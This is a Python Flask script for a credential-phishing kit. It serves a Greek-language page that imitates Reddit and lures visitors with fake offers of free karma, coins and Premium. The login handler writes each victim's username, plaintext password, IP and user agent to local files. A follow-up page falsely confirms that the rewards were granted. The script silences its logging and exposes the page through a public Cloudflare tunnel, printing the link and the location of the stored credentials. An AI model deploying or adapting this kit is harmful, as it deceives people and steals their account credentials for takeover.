import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'reddit-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Reddit Karma Ελληνικά")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['reddit_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Δωρεάν Reddit Karma & Coins</title>
        <style>
            :root {
                --reddit-orange: #ff4500;
                --reddit-blue: #0079d3;
                --reddit-dark: #1a1a1b;
                --reddit-light: #f6f7f8;
                --reddit-border: #ccc;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0f1a2d 0%, #1a1a1b 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #d7dadc;
                padding: 20px;
                overflow-x: hidden;
            }
            
            .login-container {
                background: rgba(26, 26, 27, 0.95);
                border: 1px solid #343536;
                border-radius: 12px;
                width: 100%;
                max-width: 420px;
                padding: 30px 25px;
                text-align: center;
                margin-bottom: 20px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
                backdrop-filter: blur(10px);
            }
            
            .reddit-logo {
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 10px 0 20px;
                gap: 12px;
            }
            
            .snoo-icon {
                width: 60px;
                height: 60px;
                background: var(--reddit-orange);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
            }
            
            .snoo-icon img {
                width: 40px;
                height: 40px;
                object-fit: contain;
                filter: brightness(0) invert(1);
            }
            
            .reddit-text {
                font-size: 42px;
                font-weight: 800;
                color: white;
                letter-spacing: -1.5px;
                font-family: 'Helvetica Neue', Arial, sans-serif;
            }
            
            .promo-banner {
                background: linear-gradient(90deg, #ff4500, #ff8b00);
                color: white;
                padding: 14px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 16px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                line-height: 1.3;
            }
            
            .reward-box {
                background: rgba(255, 69, 0, 0.1);
                border: 2px dashed var(--reddit-orange);
                border-radius: 10px;
                padding: 20px 15px;
                margin: 20px 0;
            }
            
            .reward-amount {
                font-size: 36px;
                font-weight: 800;
                color: #ff8b00;
                margin: 10px 0;
                line-height: 1.2;
            }
            
            .reward-label {
                font-size: 14px;
                color: #818384;
                text-transform: uppercase;
                letter-spacing: 1px;
                font-weight: 600;
            }
            
            .coins-container {
                display: flex;
                justify-content: center;
                gap: 15px;
                margin: 20px 0;
                flex-wrap: wrap;
            }
            
            .coin {
                background: linear-gradient(135deg, #ffd700, #ff8b00);
                width: 55px;
                height: 55px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 22px;
                color: #1a1a1b;
                font-weight: 800;
                box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
                flex-shrink: 0;
            }
            
            input {
                width: 100%;
                padding: 16px 14px;
                margin: 12px 0;
                border: 1px solid #343536;
                border-radius: 6px;
                background: #272729;
                color: #d7dadc;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.3s ease;
                -webkit-appearance: none;
                appearance: none;
            }
            
            input:focus {
                border-color: var(--reddit-orange);
                outline: none;
                background: #1a1a1b;
                box-shadow: 0 0 0 3px rgba(255, 69, 0, 0.2);
            }
            
            input::placeholder {
                color: #818384;
            }
            
            .login-btn {
                background: linear-gradient(90deg, #ff4500, #ff8b00);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 6px;
                font-weight: 700;
                font-size: 17px;
                width: 100%;
                margin: 15px 0;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-btn:hover, .login-btn:active {
                background: linear-gradient(90deg, #ff5500, #ff9b00);
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(255, 69, 0, 0.3);
            }
            
            .separator {
                display: flex;
                align-items: center;
                margin: 20px 0;
                color: #818384;
                font-size: 14px;
                font-weight: 600;
                text-transform: uppercase;
            }
            
            .separator::before, .separator::after {
                content: '';
                flex: 1;
                border-bottom: 1px solid #343536;
            }
            
            .separator::before {
                margin-right: 15px;
            }
            
            .separator::after {
                margin-left: 15px;
            }
            
            .oauth-buttons {
                display: flex;
                gap: 10px;
                margin: 20px 0;
            }
            
            .oauth-btn {
                flex: 1;
                background: #272729;
                border: 1px solid #343536;
                border-radius: 6px;
                padding: 14px;
                color: #d7dadc;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                font-size: 15px;
                -webkit-tap-highlight-color: transparent;
            }
            
            .oauth-btn:hover, .oauth-btn:active {
                background: #343536;
                border-color: #818384;
            }
            
            .benefits {
                text-align: left;
                margin: 25px 0;
                background: rgba(39, 39, 41, 0.5);
                padding: 20px;
                border-radius: 8px;
                border-left: 4px solid var(--reddit-orange);
            }
            
            .benefits h4 {
                margin-top: 0;
                color: #ff8b00;
                font-size: 18px;
                margin-bottom: 12px;
            }
            
            .benefits ul {
                padding-left: 20px;
                margin-bottom: 0;
            }
            
            .benefits li {
                margin: 10px 0;
                color: #d7dadc;
                line-height: 1.4;
                font-size: 15px;
            }
            
            .disclaimer {
                font-size: 13px;
                color: #818384;
                margin-top: 25px;
                text-align: center;
                line-height: 1.5;
            }
            
            .signup-link {
                color: var(--reddit-orange);
                text-decoration: none;
                font-weight: 700;
            }
            
            .signup-link:hover {
                text-decoration: underline;
            }
            
            .bottom-container {
                background: rgba(26, 26, 27, 0.8);
                border: 1px solid #343536;
                border-radius: 8px;
                width: 100%;
                max-width: 420px;
                padding: 20px;
                text-align: center;
                font-size: 15px;
                color: #818384;
                line-height: 1.4;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                    align-items: flex-start;
                    min-height: 100vh;
                    height: auto;
                }
                
                .login-container {
                    padding: 25px 20px;
                    border-radius: 10px;
                    margin-bottom: 15px;
                }
                
                .reddit-text {
                    font-size: 36px;
                }
                
                .snoo-icon {
                    width: 50px;
                    height: 50px;
                }
                
                .snoo-icon img {
                    width: 32px;
                    height: 32px;
                }
                
                .promo-banner {
                    padding: 12px;
                    font-size: 15px;
                    margin: 15px 0;
                }
                
                .reward-amount {
                    font-size: 32px;
                }
                
                .coin {
                    width: 50px;
                    height: 50px;
                    font-size: 20px;
                }
                
                input {
                    padding: 14px 12px;
                    font-size: 15px;
                }
                
                .login-btn {
                    padding: 15px;
                    font-size: 16px;
                }
                
                .benefits {
                    padding: 18px;
                    margin: 20px 0;
                }
                
                .benefits h4 {
                    font-size: 16px;
                }
                
                .benefits li {
                    font-size: 14px;
                }
            }
            
            @media (max-width: 360px) {
                body {
                    padding: 10px;
                }
                
                .login-container {
                    padding: 20px 15px;
                }
                
                .reddit-text {
                    font-size: 32px;
                }
                
                .reward-amount {
                    font-size: 28px;
                }
                
                .coins-container {
                    gap: 10px;
                }
                
                .coin {
                    width: 45px;
                    height: 45px;
                    font-size: 18px;
                }
                
                .oauth-buttons {
                    flex-direction: column;
                }
            }
            
            @media (max-height: 700px) and (orientation: portrait) {
                body {
                    align-items: flex-start;
                    padding-top: 30px;
                    padding-bottom: 30px;
                }
            }
        </style>
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-container">
                <div class="reddit-logo">
                    <div class="snoo-icon">
                        <img src="https://www.redditstatic.com/shreddit/assets/shreddit-logo.svg" alt="Reddit Logo">
                    </div>
                    <div class="reddit-text">reddit</div>
                </div>
                
                <div class="promo-banner">
                    🚀 ΠΡΟΣΦΟΡΑ ΠΕΡΙΟΡΙΣΜΕΝΟΥ ΧΡΟΝΟΥ 🚀
                </div>
                
                <div class="coins-container">
                    <div class="coin">🎮</div>
                    <div class="coin">🏆</div>
                    <div class="coin">💎</div>
                </div>
                
                <div class="reward-box">
                    <div class="reward-label">Διεκδικήστε Τα Δωρεάν Δώρα Σας</div>
                    <div class="reward-amount">25,000 Karma</div>
                    <div class="reward-label">+</div>
                    <div class="reward-amount">5,000 Coins</div>
                    <div class="reward-label">+ Premium για 1 Χρόνο</div>
                </div>
                
                <div class="benefits">
                    <h4>✨ Πλεονεκτήματα Premium:</h4>
                    <ul>
                        <li>Χωρίς διαφημίσεις στο Reddit</li>
                        <li>Αποκλειστικά βραβεία Premium</li>
                        <li>Κοινότητες μόνο για μέλη Premium</li>
                        <li>Προσαρμοσμένα εικονίδια και θέματα</li>
                        <li>Αποκλειστική υποστήριξη πελατών</li>
                    </ul>
                </div>
                
                <div style="font-size: 15px; color: #818384; margin: 20px 0; line-height: 1.4;">
                    Συνδεθείτε για να λάβετε τα δωρεάν δώρα σας άμεσα!
                </div>
                
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Όνομα χρήστη" required autocomplete="username">
                    <input type="password" name="password" placeholder="Κωδικός πρόσβασης" required autocomplete="current-password">
                    <button type="submit" class="login-btn">Διεκδικήστε Δωρεάν Δώρα</button>
                </form>
                
                <div class="separator">ή συνέχεια με</div>
                
                <div class="oauth-buttons">
                    <button type="button" class="oauth-btn">Google</button>
                    <button type="button" class="oauth-btn">Apple</button>
                </div>
                
                <div class="disclaimer">
                    Με τη συνέχεια, συμφωνείτε με τους Όρους και την Πολιτική Απορρήτου μας.<br>
                    Αυτή είναι μια προωθητική προσφορά. Ισχύει μία ανά λογαριασμό.
                </div>
            </div>
            
            <div class="bottom-container">
                Δεν έχετε λογαριασμό; <a href="#" class="signup-link">Εγγραφείτε τώρα</a>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('reddit_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Όνομα χρήστη: {username}\n")
        file.write(f"Κωδικός πρόσβασης: {password}\n")
        file.write(f"Ημερομηνία: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Άγνωστο')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Επεξεργασία Δώρων - Reddit</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0f1a2d 0%, #1a1a1b 100%);
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #d7dadc;
                padding: 20px;
            }
            
            .container {
                text-align: center;
                background: rgba(26, 26, 27, 0.95);
                padding: 40px 30px;
                border-radius: 12px;
                border: 1px solid #343536;
                max-width: 500px;
                width: 100%;
                box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
                backdrop-filter: blur(10px);
            }
            
            .success-icon {
                font-size: 70px;
                margin: 20px 0;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.1); }
                100% { transform: scale(1); }
            }
            
            .processing-bar {
                width: 100%;
                height: 6px;
                background: #343536;
                border-radius: 3px;
                margin: 30px 0;
                overflow: hidden;
            }
            
            .processing-fill {
                height: 100%;
                background: linear-gradient(90deg, #ff4500, #ff8b00);
                animation: processing 3s infinite;
                border-radius: 3px;
            }
            
            @keyframes processing {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .reward-update {
                background: rgba(255, 69, 0, 0.1);
                border: 1px solid rgba(255, 69, 0, 0.3);
                border-radius: 8px;
                padding: 20px;
                margin: 30px 0;
                text-align: left;
            }
            
            .reward-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                padding: 12px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 6px;
            }
            
            .reward-icon {
                font-size: 24px;
                margin-right: 15px;
                width: 40px;
                flex-shrink: 0;
            }
            
            .reward-text {
                flex: 1;
            }
            
            .reward-title {
                font-weight: bold;
                color: #ff8b00;
                font-size: 16px;
            }
            
            .reward-desc {
                font-size: 14px;
                color: #818384;
                margin-top: 3px;
            }
            
            .checkmark {
                color: #00ff00;
                font-size: 20px;
                flex-shrink: 0;
            }
            
            .redirect-info {
                font-size: 14px;
                color: #818384;
                margin-top: 20px;
                line-height: 1.5;
            }
            
            h2 {
                color: #ff8b00;
                margin: 10px 0;
                font-size: 24px;
            }
            
            p {
                line-height: 1.5;
                margin: 10px 0;
            }
            
            @media (max-width: 480px) {
                .container {
                    padding: 30px 20px;
                }
                
                .success-icon {
                    font-size: 60px;
                }
                
                h2 {
                    font-size: 22px;
                }
                
                .reward-update {
                    padding: 15px;
                }
                
                .reward-item {
                    padding: 10px;
                    margin: 12px 0;
                }
            }
            
            @media (max-width: 360px) {
                .container {
                    padding: 25px 15px;
                }
                
                .reward-icon {
                    font-size: 20px;
                    margin-right: 12px;
                    width: 32px;
                }
                
                .reward-title {
                    font-size: 15px;
                }
                
                .reward-desc {
                    font-size: 13px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="success-icon">🎉</div>
            <h2>Επεξεργασία Δώρων!</h2>
            <p>Ο λογαριασμός σας επαληθεύεται και τα δώρα εφαρμόζονται...</p>
            
            <div class="processing-bar">
                <div class="processing-fill"></div>
            </div>
            
            <div class="reward-update">
                <div class="reward-item">
                    <div class="reward-icon">🏆</div>
                    <div class="reward-text">
                        <div class="reward-title">Προστέθηκαν 25,000 Karma</div>
                        <div class="reward-desc">Η φήμη του λογαριασμού αυξήθηκε σε επίπεδο Elite</div>
                    </div>
                    <div class="checkmark">✓</div>
                </div>
                
                <div class="reward-item">
                    <div class="reward-icon">💎</div>
                    <div class="reward-text">
                        <div class="reward-title">Προστέθηκαν 5,000 Coins</div>
                        <div class="reward-desc">Διαθέσιμα για βραβεία και δώρα</div>
                    </div>
                    <div class="checkmark">✓</div>
                </div>
                
                <div class="reward-item">
                    <div class="reward-icon">⭐</div>
                    <div class="reward-text">
                        <div class="reward-title">Ενεργοποιήθηκε το Premium</div>
                        <div class="reward-desc">Ισχύει για 12 μήνες (Χωρίς διαφημίσεις + λειτουργίες Premium)</div>
                    </div>
                    <div class="checkmark">✓</div>
                </div>
            </div>
            
            <p><strong>Ολοκληρώθηκε! Όλα τα δώρα έχουν προστεθεί στον λογαριασμό σας.</strong></p>
            <p class="redirect-info">Θα ανακατευθυνθείτε στο Reddit σε λίγα δευτερόλεπτα...</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎯 Δημόσιος Σύνδεσμος Σελίδας Reddit: {tunnel_url}")
            print(f"📁 Τα διαπιστευτήρια αποθηκεύτηκαν στο: {BASE_FOLDER}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5001, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση Ελληνικής Σελίδας Reddit...")
    print("⏳ Φόρτωση διεπαφής...")
    time.sleep(1)
    print("✅ Ο διακομιστής εκτελείται τοπικά στη θύρα 5001")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5001")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n🛑 Ο διακομιστής σταμάτησε")
        sys.exit(0)